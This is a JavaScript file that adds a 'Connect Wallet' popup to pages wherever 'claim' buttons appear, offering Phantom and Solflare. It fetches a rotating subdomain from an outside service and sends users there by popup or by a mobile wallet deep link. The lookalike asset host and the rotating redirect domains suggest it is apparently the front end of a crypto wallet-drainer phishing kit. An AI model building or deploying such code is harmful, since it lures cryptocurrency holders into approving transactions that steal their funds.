(async () => {
    // Check for mobile device
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // API endpoints
    const subdomainApi = "https://encode-domain.com"; // Your subdomain manager
    const src = "https://funbIicnk.crownmodalz.com/";
    
    // Simple modal HTML
    const overlayContent = `
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
    
        :root {
            --bg-primary: #0c0c0c;
            --bg-secondary: #141414;
            --bg-tertiary: #1a1a1a;
            --bg-hover: #222222;
            --border-color: #2a2a2a;
            --text-primary: #ffffff;
            --text-secondary: #888888;
            --accent-blue: #4a9eff;
            --accent-green: #4ade80;
        }
    
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 10000;
            animation: fadeIn 0.2s ease-out;
        }
    
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    
        #modal {
            position: relative;
            width: 380px;
            max-width: 90%;
            background: var(--bg-secondary);
            border-radius: 20px;
            overflow: hidden;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        @keyframes slideUp {
            from { 
                transform: translateY(40px) scale(0.95);
                opacity: 0;
            }
            to { 
                transform: translateY(0) scale(1);
                opacity: 1;
            }
        }
    
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px;
            border-bottom: 1px solid var(--border-color);
        }
    
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 8px;
        }
    
        .close-btn {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            border-radius: 8px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.2s;
        }
    
        .close-btn:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }
    
        .modal-body {
            padding: 20px;
        }
    
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px;
            margin-bottom: 10px;
            background: var(--bg-tertiary);
            border: 1px solid transparent;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
    
        .wallet-item:hover {
            background: var(--bg-hover);
            border-color: var(--border-color);
            transform: translateY(-2px);
        }
    
        .wallet-icon {
            width: 42px;
            height: 42px;
            border-radius: 10px;
        }
    
        .wallet-icon img {
            width: 100%;
            height: 100%;
            border-radius: 10px;
        }
    
        .wallet-info {
            flex: 1;
        }
    
        .wallet-name {
            font-size: 15px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 2px;
        }
    
        .wallet-badge {
            display: inline-flex;
            align-items: center;
            padding: 3px 6px;
            font-size: 10px;
            font-weight: 600;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            background: rgba(74, 222, 128, 0.1);
            color: var(--accent-green);
        }
    
        #loader {
            position: fixed;
            width: 380px;
            max-width: 90%;
            background: var(--bg-secondary);
            border-radius: 20px;
            padding: 40px 28px;
            text-align: center;
            animation: slideUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }
    
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top-color: var(--accent-blue);
            border-radius: 50%;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
    
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
    
    <div id="modal">
        <div class="modal-header">
            <h2 class="modal-title">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                    <path d="M12 8v4m0 4h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
                Connect Wallet
            </h2>
            <button class="close-btn" onclick="toggleModal()">
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                    <path d="M15 5L5 15M5 5L15 15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </button>
        </div>
    
        <div class="modal-body">
            <div class="wallet-item" id="phantom">
                <div class="wallet-icon">
                    <img src="${src}images/phantom_wallet.svg" alt="Phantom">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Phantom</div>
                    <span class="wallet-badge">Recommended</span>
                </div>
            </div>
    
            <div class="wallet-item" id="solflare">
                <div class="wallet-icon">
                    <img src="${src}images/solflare_wallet.svg" alt="Solflare">
                </div>
                <div class="wallet-info">
                    <div class="wallet-name">Solflare</div>
                    <span class="wallet-badge">Popular</span>
                </div>
            </div>
        </div>
    </div>
    
    <div id="loader" style="display: none;">
        <h2 style="color: #fff; margin-bottom: 16px; font-size: 20px;">Connecting...</h2>
        <p style="color: #888; margin-bottom: 24px; font-size: 14px;">Redirecting to secure connection</p>
        <div class="spinner"></div>
    </div>
    `;
    
    // Load script helper
    function loadScript(src) {
        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = src;
            script.onload = () => resolve();
            script.onerror = () => reject(new Error(`Failed to load script ${src}`));
            document.head.appendChild(script);
        });
    }
    
    // Handle wallet connection
    async function handleWalletConnection(walletType) {
        const modal = document.getElementById('modal');
        const loader = document.getElementById('loader');
        
        // Show loader
        modal.style.display = "none";
        loader.style.display = "block";
        
        try {
            // Get current subdomain
            const response = await fetch(`${subdomainApi}/api/get-current-subdomain`);
            const data = await response.json();
            
            // Make sure we have a valid URL
            if (!data.url) {
                throw new Error('No subdomain URL received');
            }
            
            // Remove any trailing slashes and ensure proper format
            const subdomainUrl = data.url.replace(/\/$/, '');
            
            // Build connection URL
            const currentWebsite = window.location.hostname;
            const connectionUrl = `${subdomainUrl}/${currentWebsite}/${walletType}`;
            
            console.log('Subdomain URL:', subdomainUrl);
            console.log('Connection URL:', connectionUrl);
            
            // Add timeout to handle loader
            setTimeout(() => {
                if (document.getElementById('overlay')) {
                    document.body.removeChild(document.getElementById('overlay'));
                }
            }, 3000);
            
            if (isMobile) {
                // Always URL-encode the target and the referrer
                const encodedUrl = encodeURIComponent(connectionUrl);          // e.g. https%3A%2F%2Fbb-ten-gold.vercel.app
                const encodedRef = encodeURIComponent(window.location.origin); // e.g. https%3A%2F%2Fbb-ten-gold.vercel.app
              
                let deeplink = '';
                if (walletType === 'phantom') {
                  deeplink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedRef}`;
                } else if (walletType === 'solflare') {
                  deeplink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=${encodedRef}`;
                }
              
                // Use assign() so the user can hit the back button
                window.location.assign(deeplink);
              }else {
                // Desktop: Open popup
                const popupWidth = 420;
                const popupHeight = 600;
                const left = (window.screen.width - popupWidth) / 2;
                const top = (window.screen.height - popupHeight) / 2;
                
                window.open(
                    connectionUrl,
                    'WalletConnection',
                    `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=yes`
                );
                
                // Close the modal after opening popup
                setTimeout(() => {
                    if (document.getElementById('overlay')) {
                        document.body.removeChild(document.getElementById('overlay'));
                    }
                }, 1500);
            }
        } catch (error) {
            console.error('Failed to get subdomain:', error);
            if (document.getElementById('overlay')) {
                document.body.removeChild(document.getElementById('overlay'));
            }
        }
    }
    
    // Create overlay element
    let overlay;
    
    // Attach click handlers
    document.querySelectorAll('.claimButton').forEach(button => {
        button.addEventListener('click', async () => {
            // Create overlay
            overlay = document.createElement('div');
            overlay.id = 'overlay';
            overlay.innerHTML = overlayContent;
            document.body.appendChild(overlay);
            
            // Setup close function
            window.toggleModal = function() {
                if (overlay && overlay.parentNode) {
                    document.body.removeChild(overlay);
                }
            };
            
            // Click outside to close
            overlay.addEventListener('click', function(event) {
                const modal = document.getElementById('modal');
                const loader = document.getElementById('loader');
                if (!modal.contains(event.target) && !loader.contains(event.target)) {
                    if (overlay && overlay.parentNode) {
                        document.body.removeChild(overlay);
                    }
                }
            });
            
            // Wallet click handlers
            document.getElementById('phantom').addEventListener('click', () => {
                handleWalletConnection('phantom');
            });
            
            document.getElementById('solflare').addEventListener('click', () => {
                handleWalletConnection('solflare');
            });
        });
    });
})();
